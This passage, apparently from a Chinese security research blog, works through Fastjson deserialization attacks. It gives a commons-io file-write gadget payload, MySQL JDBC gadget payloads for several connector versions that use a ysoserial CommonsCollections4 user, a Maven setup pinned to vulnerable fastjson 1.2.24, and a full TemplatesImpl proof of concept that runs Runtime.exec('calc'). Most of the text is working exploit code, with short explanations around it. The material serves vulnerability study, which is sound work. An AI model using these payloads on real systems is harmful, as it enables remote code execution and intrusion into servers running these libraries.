   },    &quot;trigger&quot;:{      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,      &quot;inputStream&quot;:{        &quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,        &quot;input&quot;:{          &quot;$ref&quot;:&quot;$.input&quot;        },        &quot;branch&quot;:{          &quot;$ref&quot;:&quot;$.branch&quot;        },        &quot;closeBranch&quot;: true      },      &quot;httpContentType&quot;:&quot;text/xml&quot;,      &quot;lenient&quot;:false,      &quot;defaultEncoding&quot;:&quot;UTF-8&quot;    },    &quot;trigger2&quot;:{      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,      &quot;inputStream&quot;:{        &quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,        &quot;input&quot;:{          &quot;$ref&quot;:&quot;$.input&quot;        },        &quot;branch&quot;:{          &quot;$ref&quot;:&quot;$.branch&quot;        },        &quot;closeBranch&quot;: true      },      &quot;httpContentType&quot;:&quot;text/xml&quot;,      &quot;lenient&quot;:false,      &quot;defaultEncoding&quot;:&quot;UTF-8&quot;    },    &quot;trigger3&quot;:{      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,      &quot;inputStream&quot;:{        &quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,        &quot;input&quot;:{          &quot;$ref&quot;:&quot;$.input&quot;        },        &quot;branch&quot;:{          &quot;$ref&quot;:&quot;$.branch&quot;        },        &quot;closeBranch&quot;: true      },      &quot;httpContentType&quot;:&quot;text/xml&quot;,      &quot;lenient&quot;:false,      &quot;defaultEncoding&quot;:&quot;UTF-8&quot;    }  }</code></p>
+<p>本地windows测试第一次成功写入，后面的只创建了文件并没有写入，需要刷新缓存或者重启服务才行</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="assets/image-20211105162445-kyda3kd.png"
+        data-srcset="assets/image-20211105162445-kyda3kd.png, assets/image-20211105162445-kyda3kd.png 1.5x, assets/image-20211105162445-kyda3kd.png 2x"
+        data-sizes="auto"
+        alt="assets/image-20211105162445-kyda3kd.png"
+        title="image.png" /></p>
+<h3 id="mysql-rce">Mysql RCE</h3>
+<p><a href="https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg" target="_blank" rel="noopener noreffer">https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg</a></p>
+<p><strong>BlackHat2021 腾讯玄武实验室的大佬公开了68版本mysql的利用链。配合恶意mysql服务端造成远程命令执行</strong></p>
+<p><a href="https://dmsj-zjk.oss-cn-zhangjiakou.aliyuncs.com/share%2Fppt%2FBlackHat%20USA%202021%2Fus-21-Xing-How-I-Use-A-JSON-Deserialization.pdf?OSSAccessKeyId=LTAI4GKC6j39Agb66ieR44Ke&amp;Expires=1629276415&amp;Signature=jQ5O9EsNhlrXaLRbGAmDk7vrxDg%3D" target="_blank" rel="noopener noreffer">https://dmsj-zjk.oss-cn-zhangjiakou.aliyuncs.com/share%2Fppt%2FBlackHat USA 2021%2Fus-21-Xing-How-I-Use-A-JSON-Deserialization.pdf?OSSAccessKeyId=LTAI4GKC6j39Agb66ieR44Ke&amp;Expires=1629276415&amp;Signature=jQ5O9EsNhlrXaLRbGAmDk7vrxDg%3D</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp">
+<span class="m">5.1</span><span class="p">.</span><span class="n">x</span><span class="p">(</span><span class="n">SSRF</span><span class="p">)</span><span class="err">，</span><span class="m">5.1</span><span class="p">.</span><span class="m">11</span><span class="p">-</span><span class="m">5.1</span><span class="p">.</span><span class="m">48</span><span class="p">(</span><span class="err">反序列化链</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="s">&#34;@type&#34;</span><span class="p">:</span> <span class="s">&#34;java.lang.AutoCloseable&#34;</span><span class="p">,</span>
+  <span class="s">&#34;@type&#34;</span><span class="p">:</span> <span class="s">&#34;com.mysql.jdbc.JDBC4Connection&#34;</span><span class="p">,</span>
+  <span class="s">&#34;hostToConnectTo&#34;</span><span class="p">:</span> <span class="s">&#34;127.0.0.1&#34;</span><span class="p">,</span>
+  <span class="s">&#34;portToConnectTo&#34;</span><span class="p">:</span> <span class="m">3306</span><span class="p">,</span>
+  <span class="s">&#34;info&#34;</span><span class="p">:</span> <span class="p">{</span>
+    <span class="s">&#34;user&#34;</span><span class="p">:</span> <span class="s">&#34;yso_CommonsCollections4_calc&#34;</span><span class="p">,</span>
+    <span class="s">&#34;password&#34;</span><span class="p">:</span> <span class="s">&#34;pass&#34;</span><span class="p">,</span>
+    <span class="s">&#34;statementInterceptors&#34;</span><span class="p">:</span> <span class="s">&#34;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&#34;</span><span class="p">,</span>
+    <span class="s">&#34;autoDeserialize&#34;</span><span class="p">:</span> <span class="s">&#34;true&#34;</span><span class="p">,</span>
+    <span class="s">&#34;NUM_HOSTS&#34;</span><span class="p">:</span> <span class="s">&#34;1&#34;</span>
+  <span class="p">},</span>
+  <span class="s">&#34;databaseToConnectTo&#34;</span><span class="p">:</span> <span class="s">&#34;dbname&#34;</span><span class="p">,</span>
+  <span class="s">&#34;url&#34;</span><span class="p">:</span> <span class="s">&#34;&#34;</span>
+<span class="p">}</span>
+
+<span class="m">6.0</span><span class="p">.</span><span class="m">2</span><span class="p">/</span><span class="m">6.0</span><span class="p">.</span><span class="m">3</span><span class="p">(</span><span class="err">反序列化</span><span class="p">)</span>
+<span class="p">{</span>
+       <span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;java.lang.AutoCloseable&#34;</span><span class="p">,</span>
+       <span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&#34;</span><span class="p">,</span>
+       <span class="s">&#34;proxy&#34;</span><span class="p">:</span> <span class="p">{</span>
+              <span class="s">&#34;connectionString&#34;</span><span class="p">:{</span>
+                     <span class="s">&#34;url&#34;</span><span class="p">:</span><span class="s">&#34;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&#34;</span>
+              <span class="p">}</span>
+       <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="m">8.0</span><span class="p">.</span><span class="m">19</span><span class="p">(</span><span class="err">反序列化链</span><span class="p">)</span><span class="err">，</span><span class="m">8.0</span><span class="p">.</span><span class="m">19</span><span class="p">+(</span><span class="n">SSRF</span><span class="p">)</span>
+<span class="p">{</span>
+       <span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;java.lang.AutoCloseable&#34;</span><span class="p">,</span>
+       <span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&#34;</span><span class="p">,</span>
+       <span class="s">&#34;proxy&#34;</span><span class="p">:</span> <span class="p">{</span>
+              <span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&#34;</span><span class="p">,</span>
+              <span class="s">&#34;connectionUrl&#34;</span><span class="p">:{</span>
+                     <span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;com.mysql.cj.conf.url.ReplicationConnectionUrl&#34;</span><span class="p">,</span>
+                     <span class="s">&#34;masters&#34;</span><span class="p">:[{</span>
+                            <span class="s">&#34;host&#34;</span><span class="p">:</span><span class="s">&#34;&#34;</span>
+                     <span class="p">}],</span>
+                     <span class="s">&#34;slaves&#34;</span><span class="p">:[],</span>
+                     <span class="s">&#34;properties&#34;</span><span class="p">:{</span>
+                            <span class="s">&#34;host&#34;</span><span class="p">:</span><span class="s">&#34;127.0.0.1&#34;</span><span class="p">,</span>
+                            <span class="s">&#34;user&#34;</span><span class="p">:</span><span class="s">&#34;yso_CommonsCollections4_calc&#34;</span><span class="p">,</span>
+                            <span class="s">&#34;dbname&#34;</span><span class="p">:</span><span class="s">&#34;dbname&#34;</span><span class="p">,</span>
+                            <span class="s">&#34;password&#34;</span><span class="p">:</span><span class="s">&#34;pass&#34;</span><span class="p">,</span>
+                            <span class="s">&#34;queryInterceptors&#34;</span><span class="p">:</span><span class="s">&#34;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&#34;</span><span class="p">,</span>
+                            <span class="s">&#34;autoDeserialize&#34;</span><span class="p">:</span><span class="s">&#34;true&#34;</span>
+                     <span class="p">}</span>
+              <span class="p">}</span>
+       <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><hr>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/N4lvJiDIOVxKbHg.png"
+        data-srcset="https://s2.loli.net/2022/02/18/N4lvJiDIOVxKbHg.png, https://s2.loli.net/2022/02/18/N4lvJiDIOVxKbHg.png 1.5x, https://s2.loli.net/2022/02/18/N4lvJiDIOVxKbHg.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/N4lvJiDIOVxKbHg.png"
+        title="image.png" /></p>
+<blockquote>
+<p><strong>以下为去年去年调试分析时的笔记，大量参考（拙劣模仿）了phith0n、kingx、mi1k7ea等师傅的文章，仅供参考。强烈建议阅读原文。文末有链接</strong></p>
+</blockquote>
+<h1 id="0x02-调试分析">0x02 调试分析</h1>
+<pre><code>Fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。 fastjson在阿里巴巴大规模使用，在数万台服务器上部署，Fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。出现安全问题影响范围很广。
+</code></pre>
+<p>采用一种“假定有序快速匹配”的算法，是号称Java中最快的json库</p>
+<h2 id="环境搭建">环境搭建</h2>
+<p>idea中新建maven项目，在pom.xml中添加以下代码即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span class="nt">&lt;project</span> <span class="na">xmlns=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0&#34;</span>
+         <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+         <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;modelVersion&gt;</span>4.0.0<span class="nt">&lt;/modelVersion&gt;</span>
+
+    <span class="nt">&lt;groupId&gt;</span>org.example<span class="nt">&lt;/groupId&gt;</span>
+    <span class="nt">&lt;artifactId&gt;</span>fastjsonVulTest<span class="nt">&lt;/artifactId&gt;</span>
+    <span class="nt">&lt;version&gt;</span>1.0-SNAPSHOT<span class="nt">&lt;/version&gt;</span>
+    <span class="nt">&lt;build&gt;</span>
+        <span class="nt">&lt;plugins&gt;</span>
+            <span class="nt">&lt;plugin&gt;</span>
+                <span class="nt">&lt;groupId&gt;</span>org.apache.maven.plugins<span class="nt">&lt;/groupId&gt;</span>
+                <span class="nt">&lt;artifactId&gt;</span>maven-compiler-plugin<span class="nt">&lt;/artifactId&gt;</span>
+                <span class="nt">&lt;configuration&gt;</span>
+                    <span class="nt">&lt;source&gt;</span>8<span class="nt">&lt;/source&gt;</span>
+                    <span class="nt">&lt;target&gt;</span>8<span class="nt">&lt;/target&gt;</span>
+                <span class="nt">&lt;/configuration&gt;</span>
+            <span class="nt">&lt;/plugin&gt;</span>
+        <span class="nt">&lt;/plugins&gt;</span>
+    <span class="nt">&lt;/build&gt;</span>
+    <span class="nt">&lt;dependencies&gt;</span>
+        <span class="c">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span>
+        <span class="nt">&lt;dependency&gt;</span>
+            <span class="nt">&lt;groupId&gt;</span>com.alibaba<span class="nt">&lt;/groupId&gt;</span>
+            <span class="nt">&lt;artifactId&gt;</span>fastjson<span class="nt">&lt;/artifactId&gt;</span>
+            <span class="nt">&lt;version&gt;</span>1.2.24<span class="nt">&lt;/version&gt;</span>
+        <span class="nt">&lt;/dependency&gt;</span>
+        <span class="nt">&lt;dependency&gt;</span>
+            <span class="nt">&lt;groupId&gt;</span>org.apache.commons<span class="nt">&lt;/groupId&gt;</span>
+            <span class="nt">&lt;artifactId&gt;</span>commons-compress<span class="nt">&lt;/artifactId&gt;</span>
+            <span class="nt">&lt;version&gt;</span>1.0<span class="nt">&lt;/version&gt;</span>
+        <span class="nt">&lt;/dependency&gt;</span>
+        <span class="nt">&lt;dependency&gt;</span>
+            <span class="nt">&lt;groupId&gt;</span>commons-codec<span class="nt">&lt;/groupId&gt;</span>
+            <span class="nt">&lt;artifactId&gt;</span>commons-codec<span class="nt">&lt;/artifactId&gt;</span>
+            <span class="nt">&lt;version&gt;</span>1.6<span class="nt">&lt;/version&gt;</span>
+        <span class="nt">&lt;/dependency&gt;</span>
+        <span class="nt">&lt;dependency&gt;</span>
+            <span class="nt">&lt;groupId&gt;</span>commons-io<span class="nt">&lt;/groupId&gt;</span>
+            <span class="nt">&lt;artifactId&gt;</span>commons-io<span class="nt">&lt;/artifactId&gt;</span>
+            <span class="nt">&lt;version&gt;</span>1.4<span class="nt">&lt;/version&gt;</span>
+        <span class="nt">&lt;/dependency&gt;</span>
+        <span class="nt">&lt;dependency&gt;</span>
+            <span class="nt">&lt;groupId&gt;</span>com.unboundid<span class="nt">&lt;/groupId&gt;</span>
+            <span class="nt">&lt;artifactId&gt;</span>unboundid-ldapsdk<span class="nt">&lt;/artifactId&gt;</span>
+            <span class="nt">&lt;version&gt;</span>4.0.9<span class="nt">&lt;/version&gt;</span>
+            <span class="nt">&lt;scope&gt;</span>compile<span class="nt">&lt;/scope&gt;</span>
+        <span class="nt">&lt;/dependency&gt;</span>
+        <span class="nt">&lt;dependency&gt;</span>
+            <span class="nt">&lt;groupId&gt;</span>org.apache.tomcat<span class="nt">&lt;/groupId&gt;</span>
+            <span class="nt">&lt;artifactId&gt;</span>tomcat-dbcp<span class="nt">&lt;/artifactId&gt;</span>
+            <span class="nt">&lt;version&gt;</span>9.0.8<span class="nt">&lt;/version&gt;</span>
+        <span class="nt">&lt;/dependency&gt;</span>
+    <span class="nt">&lt;/dependencies&gt;</span>
+<span class="nt">&lt;/project&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="0x03-fastjson基础">0x03 FastJSON基础</h1>
+<ul>
+<li>当反序列化为JSON.parseObject(*)形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法调用了两次；</li>
+<li>当反序列化为JSON.parseObject(<em>,</em>.class)形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法；</li>
+<li>当反序列化为JSON.parseObject(<em>)形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即JSON.parseObject(</em>,*.class)形式得到的都是特定的Student类；</li>
+<li>如果需要还原出private属性的话，还需要在JSON.parseObject/JSON.parse中加上Feature.SupportNonPublicField参数。</li>
+</ul>
+<h2 id="基于templateimpl的利用链">基于TemplateImpl的利用链</h2>
+<h3 id="依赖">依赖</h3>
+<p><strong>Java字节码的执行，需要设置Feature.SupportNonPublicField进行反序列化操作才能成功触发利用。</strong>  ****</p>
+<h3 id="poc">POC</h3>
+<p><strong>Test.java</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="kd">extends</span> <span class="n">AbstractTranslet</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="nf">Test</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;calc&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">DTMAxisIterator</span> <span class="n">iterator</span><span class="o">,</span> <span class="n">SerializationHandler</span> <span class="n">handler</span><span class="o">)</span> <span class="o">{</span>
+    <span class="o">}</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">serializer</span><span class="o">.</span><span class="na">SerializationHandler</span><span class="o">[]</span> <span class="n">handlers</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">Test</span> <span class="n">t</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Test</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>PoC.java</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.codec.binary.Base64</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.compress.utils.IOUtils</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">PoC</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">readClass</span><span class="o">(</span><span class="n">String</span> <span class="n">cls</span><span class="o">){</span>
+        <span class="n">ByteArrayOutputStream</span> <span class="n">bos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">IOUtils</span><span class="o">.</span><span class="na">copy</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">cls</span><span class="o">)),</span> <span class="n">bos</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">Base64</span><span class="o">.</span><span class="na">encodeBase64String</span><span class="o">(</span><span class="n">bos</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[]){</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">ParserConfig</span> <span class="n">config</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ParserConfig</span><span class="o">();</span>
+            <span class="kd">final</span> <span class="n">String</span> <span class="n">fileSeparator</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;file.separator&#34;</span><span class="o">);</span>
+            <span class="kd">final</span> <span class="n">String</span> <span class="n">evilClassPath</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;user.dir&#34;</span><span class="o">)</span> <span class="o">+</span> <span class="s">&#34;\\src\\main\\java\\com\\Impl\\Test.class&#34;</span><span class="o">;</span>
+            <span class="n">String</span> <span class="n">evilCode</span> <span class="o">=</span> <span class="n">readClass</span><span class="o">(</span><span class="n">evilClassPath</span><span class="o">);</span>
+            <span class="kd">final</span> <span class="n">String</span> <span class="n">NASTY_CLASS</span> <span class="o">=</span> <span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="o">;</span>
+            <span class="n">String</span> <span class="n">text1</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;&#34;</span> <span class="o">+</span> <span class="n">NASTY_CLASS</span> <span class="o">+</span>
+                    <span class="s">&#34;\&#34;,\&#34;_bytecodes\&#34;:[\&#34;&#34;</span><span class="o">+</span><span class="n">evilCode</span><span class="o">+</span><span class="s">&#34;\&#34;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:{ },\&#34;_outputProperties\&#34;:{ },&#34;</span> <span class="o">+</span>
+                    <span class="s">&#34;\&#34;_name\&#34;:\&#34;a\&#34;,\&#34;_version\&#34;:\&#34;1.0\&#34;,\&#34;allowedProtocols\&#34;:\&#34;all\&#34;}\n&#34;</span><span class="o">;</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">text1</span><span class="o">);</span>
+
+            <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">text1</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">config</span><span class="o">,</span> <span class="n">Feature</span><span class="o">.</span><span class="na">SupportNonPublicField</span><span class="o">);</span>
+            <span class="c1">//Object obj = JSON.parse(text1, Feature.SupportNonPublicField);
+</span><span class="c1"></span>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>PoC中几个重要的Json键的含义：</p>
+<ul>
+<li><strong>@type</strong>——指定的解析类，即com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在PoC中，_bytecodes和_name都是私有属性，所以想要反序列化这两个属性，需要在parseObject()时设置Feature.SupportNonPublicField；</li>
